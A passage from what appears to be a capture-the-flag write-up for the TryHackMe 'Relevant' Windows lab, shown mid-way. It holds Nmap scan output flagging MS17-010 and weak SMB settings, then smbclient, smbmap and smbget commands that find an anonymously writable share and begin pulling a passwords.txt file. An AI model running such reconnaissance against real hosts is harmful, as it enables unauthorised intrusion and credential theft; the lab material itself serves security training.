|     ncalrpc: actkernel
|     uuid: c605f9fb-f0a3-4e2a-a073-73560f8d9e3e
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: c605f9fb-f0a3-4e2a-a073-73560f8d9e3e
|   
|     ncalrpc: LSMApi
|     uuid: c605f9fb-f0a3-4e2a-a073-73560f8d9e3e
|   
|     netbios: \\RELEVANT
|     uuid: c605f9fb-f0a3-4e2a-a073-73560f8d9e3e
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: umpo
|     uuid: 0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e
|   
|     ncalrpc: actkernel
|     uuid: 0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e
|   
|     ncalrpc: LSMApi
|     uuid: 0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e
|   
|     netbios: \\RELEVANT
|     uuid: 0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: umpo
|     uuid: 2c7fd9ce-e706-4b40-b412-953107ef9bb0
|   
|     ncalrpc: actkernel
|     uuid: 2c7fd9ce-e706-4b40-b412-953107ef9bb0
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 2c7fd9ce-e706-4b40-b412-953107ef9bb0
|   
|     ncalrpc: LSMApi
|     uuid: 2c7fd9ce-e706-4b40-b412-953107ef9bb0
|   
|     netbios: \\RELEVANT
|     uuid: 2c7fd9ce-e706-4b40-b412-953107ef9bb0
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 2c7fd9ce-e706-4b40-b412-953107ef9bb0
|   
|     ncalrpc: umpo
|     uuid: c521facf-09a9-42c5-b155-72388595cbf0
|   
|     ncalrpc: actkernel
|     uuid: c521facf-09a9-42c5-b155-72388595cbf0
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: c521facf-09a9-42c5-b155-72388595cbf0
|   
|     ncalrpc: LSMApi
|     uuid: c521facf-09a9-42c5-b155-72388595cbf0
|   
|     netbios: \\RELEVANT
|     uuid: c521facf-09a9-42c5-b155-72388595cbf0
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: c521facf-09a9-42c5-b155-72388595cbf0
|   
|     ncalrpc: umpo
|     uuid: 1832bcf6-cab8-41d4-85d2-c9410764f75a
|   
|     ncalrpc: actkernel
|     uuid: 1832bcf6-cab8-41d4-85d2-c9410764f75a
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 1832bcf6-cab8-41d4-85d2-c9410764f75a
|   
|     ncalrpc: LSMApi
|     uuid: 1832bcf6-cab8-41d4-85d2-c9410764f75a
|   
|     netbios: \\RELEVANT
|     uuid: 1832bcf6-cab8-41d4-85d2-c9410764f75a
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 1832bcf6-cab8-41d4-85d2-c9410764f75a
|   
|     ncalrpc: umpo
|     uuid: 4dace966-a243-4450-ae3f-9b7bcb5315b8
|   
|     ncalrpc: actkernel
|     uuid: 4dace966-a243-4450-ae3f-9b7bcb5315b8
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 4dace966-a243-4450-ae3f-9b7bcb5315b8
|   
|     ncalrpc: LSMApi
|     uuid: 4dace966-a243-4450-ae3f-9b7bcb5315b8
|   
|     netbios: \\RELEVANT
|     uuid: 4dace966-a243-4450-ae3f-9b7bcb5315b8
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 4dace966-a243-4450-ae3f-9b7bcb5315b8
|   
|     ncalrpc: umpo
|     uuid: 55e6b932-1979-45d6-90c5-7f6270724112
|   
|     ncalrpc: actkernel
|     uuid: 55e6b932-1979-45d6-90c5-7f6270724112
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 55e6b932-1979-45d6-90c5-7f6270724112
|   
|     ncalrpc: LSMApi
|     uuid: 55e6b932-1979-45d6-90c5-7f6270724112
|   
|     netbios: \\RELEVANT
|     uuid: 55e6b932-1979-45d6-90c5-7f6270724112
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 55e6b932-1979-45d6-90c5-7f6270724112
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: 55e6b932-1979-45d6-90c5-7f6270724112
|   
|     ncalrpc: umpo
|     uuid: 76c217bc-c8b4-4201-a745-373ad9032b1a
|   
|     ncalrpc: actkernel
|     uuid: 76c217bc-c8b4-4201-a745-373ad9032b1a
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 76c217bc-c8b4-4201-a745-373ad9032b1a
|   
|     ncalrpc: LSMApi
|     uuid: 76c217bc-c8b4-4201-a745-373ad9032b1a
|   
|     netbios: \\RELEVANT
|     uuid: 76c217bc-c8b4-4201-a745-373ad9032b1a
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 76c217bc-c8b4-4201-a745-373ad9032b1a
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: 76c217bc-c8b4-4201-a745-373ad9032b1a
|   
|     ncalrpc: umpo
|     uuid: 88abcbc3-34ea-76ae-8215-767520655a23
|   
|     ncalrpc: actkernel
|     uuid: 88abcbc3-34ea-76ae-8215-767520655a23
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 88abcbc3-34ea-76ae-8215-767520655a23
|   
|     ncalrpc: LSMApi
|     uuid: 88abcbc3-34ea-76ae-8215-767520655a23
|   
|     netbios: \\RELEVANT
|     uuid: 88abcbc3-34ea-76ae-8215-767520655a23
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 88abcbc3-34ea-76ae-8215-767520655a23
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: 88abcbc3-34ea-76ae-8215-767520655a23
|   
|     ncalrpc: umpo
|     uuid: 2513bcbe-6cd4-4348-855e-7efb3c336dd3
|   
|     ncalrpc: actkernel
|     uuid: 2513bcbe-6cd4-4348-855e-7efb3c336dd3
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 2513bcbe-6cd4-4348-855e-7efb3c336dd3
|   
|     ncalrpc: LSMApi
|     uuid: 2513bcbe-6cd4-4348-855e-7efb3c336dd3
|   
|     netbios: \\RELEVANT
|     uuid: 2513bcbe-6cd4-4348-855e-7efb3c336dd3
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 2513bcbe-6cd4-4348-855e-7efb3c336dd3
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: 2513bcbe-6cd4-4348-855e-7efb3c336dd3
|   
|     ncalrpc: umpo
|     uuid: 20c40295-8dba-48e6-aebf-3e78ef3bb144
|   
|     ncalrpc: actkernel
|     uuid: 20c40295-8dba-48e6-aebf-3e78ef3bb144
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 20c40295-8dba-48e6-aebf-3e78ef3bb144
|   
|     ncalrpc: LSMApi
|     uuid: 20c40295-8dba-48e6-aebf-3e78ef3bb144
|   
|     netbios: \\RELEVANT
|     uuid: 20c40295-8dba-48e6-aebf-3e78ef3bb144
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 20c40295-8dba-48e6-aebf-3e78ef3bb144
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: 20c40295-8dba-48e6-aebf-3e78ef3bb144
|   
|     ncalrpc: umpo
|     uuid: b8cadbaf-e84b-46b9-84f2-6f71c03f9e55
|   
|     ncalrpc: actkernel
|     uuid: b8cadbaf-e84b-46b9-84f2-6f71c03f9e55
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: b8cadbaf-e84b-46b9-84f2-6f71c03f9e55
|   
|     ncalrpc: LSMApi
|     uuid: b8cadbaf-e84b-46b9-84f2-6f71c03f9e55
|   
|     netbios: \\RELEVANT
|     uuid: b8cadbaf-e84b-46b9-84f2-6f71c03f9e55
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: b8cadbaf-e84b-46b9-84f2-6f71c03f9e55
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: b8cadbaf-e84b-46b9-84f2-6f71c03f9e55
|   
|     ncalrpc: umpo
|     uuid: 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf
|   
|     ncalrpc: actkernel
|     uuid: 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf
|   
|     ncalrpc: LSMApi
|     uuid: 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf
|   
|     netbios: \\RELEVANT
|     uuid: 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: 857fb1be-084f-4fb5-b59c-4b2c4be5f0cf
|   
|     ncalrpc: umpo
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: actkernel
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LSMApi
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     netbios: \\RELEVANT
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LRPC-7a1dc542a5529de9f8
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: umpo
|     uuid: 697dcda9-3ba9-4eb2-9247-e11f1901b0d2
|   
|     ncalrpc: actkernel
|     uuid: 697dcda9-3ba9-4eb2-9247-e11f1901b0d2
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 697dcda9-3ba9-4eb2-9247-e11f1901b0d2
|   
|     ncalrpc: LSMApi
|     uuid: 697dcda9-3ba9-4eb2-9247-e11f1901b0d2
|   
|     netbios: \\RELEVANT
|     uuid: 697dcda9-3ba9-4eb2-9247-e11f1901b0d2
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 697dcda9-3ba9-4eb2-9247-e11f1901b0d2
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: 697dcda9-3ba9-4eb2-9247-e11f1901b0d2
|   
|     ncalrpc: LRPC-7a1dc542a5529de9f8
|     uuid: 697dcda9-3ba9-4eb2-9247-e11f1901b0d2
|   
|     ncalrpc: LRPC-627de712330530831f
|     uuid: 697dcda9-3ba9-4eb2-9247-e11f1901b0d2
|   
|     ncalrpc: umpo
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: actkernel
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LSMApi
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     netbios: \\RELEVANT
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LRPC-7a1dc542a5529de9f8
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LRPC-627de712330530831f
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: csebpub
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: umpo
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     ncalrpc: actkernel
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     ncalrpc: LSMApi
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     netbios: \\RELEVANT
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: OLE741C4814DD0EBE9EAA4341420CB2
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     ncalrpc: LRPC-c04a6ccc70e89a2bff
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     ncalrpc: LRPC-7a1dc542a5529de9f8
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     ncalrpc: LRPC-627de712330530831f
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     ncalrpc: csebpub
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     ncalrpc: dabrpc
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     ncalrpc: LRPC-f6328cad57101f7acc
|     uuid: 9b008953-f195-4bf9-bde0-4471971e58ed
|   
|     ncalrpc: WMsgKRpc057420
|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
|   
|     netbios: \\RELEVANT
|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
|     ncacn_np: \PIPE\InitShutdown
|   
|     ncalrpc: WindowsShutdown
|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
|   
|     ncalrpc: WMsgKRpc057420
|     uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
|   
|     netbios: \\RELEVANT
|     uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
|     ncacn_np: \PIPE\InitShutdown
|   
|     ncalrpc: WindowsShutdown
|_    uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56640/tcp): CLEAN (Timeout)
|   Check 2 (port 61258/tcp): CLEAN (Timeout)
|   Check 3 (port 57549/udp): CLEAN (Timeout)
|   Check 4 (port 61699/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_path-mtu: ERROR: Script execution failed (use -d to debug)
|_qscan: ERROR: Script execution failed (use -d to debug)
| smb-mbenum: 
|_  ERROR: Call to Browser Service failed with status = 2184
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-23T09:06:46-07:00
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
| smb2-capabilities: 
|   2.02: 
|     Distributed File System
|   2.10: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.00: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.02: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.11: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-23T16:06:39
|_  start_date: 2021-07-23T15:53:51
| traceroute-geolocation: 
|   HOP  RTT     ADDRESS       GEOLOCATION
|   1    98.00   10.4.0.1      - ,- 
|   2    ...
|   3    ...
|_  4    394.00  10.10.63.141  - ,- 

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   98.00 ms  10.4.0.1
2   ... 3
4   394.00 ms 10.10.63.141

Nmap scan report for 10.10.63.141
Host is up, received user-set (0.36s latency).
Scanned at 2021-07-24 00:13:27 Malay Peninsula Standard Time for 974s
Not shown: 65527 filtered ports
Reason: 65527 no-responses
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.63.141
|     
|     Path: http://10.10.63.141:80/
|     Line number: 7
|     Comment: 

|_        -->
|_http-date: Fri, 23 Jul 2021 16:06:52 GMT; -15m04s from local time.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers: 
|   Content-Length: 703
|   Content-Type: text/html
|   Last-Modified: Sat, 25 Jul 2020 15:05:21 GMT
|   Accept-Ranges: bytes
|   ETag: "2db43349562d61:0"
|   Server: Microsoft-IIS/10.0
|   X-Powered-By: ASP.NET
|   Date: Fri, 23 Jul 2021 16:22:03 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-malware-host: Host appears to be clean
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-mobileversion-checker: No mobile version detected.
| http-php-version: Logo query returned unknown hash 242c23ea412530c7d94b77a7a978c176
|_Credits query returned unknown hash 242c23ea412530c7d94b77a7a978c176
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
|_http-server-header: Microsoft-IIS/10.0
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-title: IIS Windows Server
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-xssed: No previously reported XSS vuln.
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 125 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-07-23T16:21:59+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-22T15:53:10
| Not valid after:  2022-01-21T15:53:10
| MD5:   5b61 d029 1a17 b7d4 3c86 0172 9cbc 7cd8
| SHA-1: 21af 8329 61c9 d793 54c6 30a1 f4c3 8227 3ae6 5892
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQFD8FKMCUQJtGVcz9SFPi5zANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMTA3MjIxNTUzMTBaFw0yMjAxMjExNTUz
| MTBaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAynMgc1e4OBf1u1fudOc+vSH9p4E2oDFim5eJvlng6v+T7p15XySm
| x0eCzE95zuw6mZhkT39NTjV/ray9ikTxd4uVcbOhgmJUF6PCKtzNsquiCqRv6eHh
| FyLG5aUSk8U8wQ6v87tbFP3x3/WGeqU05tlZ+mZt0d7nQP57UYBbt/HCmCXnABfi
| RhECsyhP+rTvKXSAK1iZ484sAbdE/s/v6u0JxveKFJuSBQVJ3VB4tnmwB0Qn9Ujd
| geEumrKDCp69AEf4UIDvklaHzydZTZzCSuAMbmWg7WJEOQI06QMqkDVbFdjE3T/c
| btB+p2qNuKos36Mx/2UYtehyPqJy9CnWewIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKDENUB5Y0qj
| mTZWXxswMeQtA9VGCClCDuSIsa0S9KQTCKLq5iXRKsCcsrDdIAWTbhSu0tLCzP/h
| hsnzJHjEzDXpBaOIwjU8fKVR7mYF4eZV89M5zN7SDXHJX1lowJUrk2ftfA3fO313
| n67GUpd4snmXX2lKpZnlesBFdsZa9IT0RghktC5WTvhKDZG/DMJbEXKZuXB2FxIK
| DgGE4n7uAoK/actZObW91FkupWN+SLXlNZJMk9UhljqU66HLhB8zUJfDV7vqBTYD
| j+c0N6zqoltN8bSxt5vFx1PkI8gjN1kKUeUE2eAgE+Pm8LJzpe4RnRLUxALujxMH
| v84RL1Sdy70=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-07-23T16:29:29+00:00; -1s from scanner time.
49663/tcp open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.63.141
|     
|     Path: http://10.10.63.141:49663/
|     Line number: 7
|     Comment: 
   
|_        -->
|_http-date: Fri, 23 Jul 2021 16:22:00 GMT; -2s from local time.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers: 
|   Content-Length: 703
|   Content-Type: text/html
|   Last-Modified: Sat, 25 Jul 2020 15:05:21 GMT
|   Accept-Ranges: bytes
|   ETag: "2db43349562d61:0"
|   Server: Microsoft-IIS/10.0
|   X-Powered-By: ASP.NET
|   Date: Fri, 23 Jul 2021 16:21:58 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-malware-host: Host appears to be clean
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-mobileversion-checker: No mobile version detected.
| http-php-version: Logo query returned unknown hash 242c23ea412530c7d94b77a7a978c176
|_Credits query returned unknown hash 242c23ea412530c7d94b77a7a978c176
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
|_http-title: IIS Windows Server
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-xssed: No previously reported XSS vuln.
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/24%OT=80%CT=%CU=%PV=Y%DS=4%DC=T%G=N%TM=60FAEE75%P=i686-pc-windows-windows)
SEQ(SP=102%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=A)
OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M508NW8ST11%O6=M508ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M508NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.027 days (since Fri Jul 23 23:50:16 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Nmap smb:

```text
# Nmap 7.91 scan initiated Sat Jul 24 00:05:13 2021 as: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN TryHackMe-Relevant-smb 10.10.63.141
Nmap scan report for 10.10.63.141
Host is up (0.36s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.63.141\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.63.141\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.63.141\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.63.141\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

# Nmap done at Sat Jul 24 00:07:03 2021 -- 1 IP address (1 host up) scanned in 110.10 seconds
```

As we can get from the nmap result, we have SMB, let's enum further ...

SMB Enumeration:

```bash
┌💁  root @ 💻  austin-helper-x13 in 📁  Desktop
└❯ smbclient -L \\\\10.10.63.141
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
SMB1 disabled -- no workgroup available

┌💁  root @ 💻  austin-helper-x13 in 📁  Desktop
└❯ smbmap -u anonymous -p anonymous -H 10.10.63.141
[+] Guest session       IP: 10.10.63.141:445    Name: 10.10.63.141
        Disk                                                    Permissions     Comment
[-] Work----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        nt4wrksv                                                READ, WRITE

┌💁  root @ 💻  austin-helper-x13 in 📁  Desktop
└❯ smbmap -u anonymous -p anonymous -H 10.10.63.141 -R 'nt4wrksv'
[+] Guest session       IP: 10.10.63.141:445    Name: 10.10.63.141
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        nt4wrksv                                                READ, WRITE
        .\nt4wrksv\*
        fr--r--r--               98 Sat Jul 25 23:35:44 2020    passwords.txt

┌💁  root @ 💻  austin-helper-x13 in 📁  Desktop
└❯ smbget -Rrv smb://10.10.63.141/nt4wrksv -U anonymous%anonymous
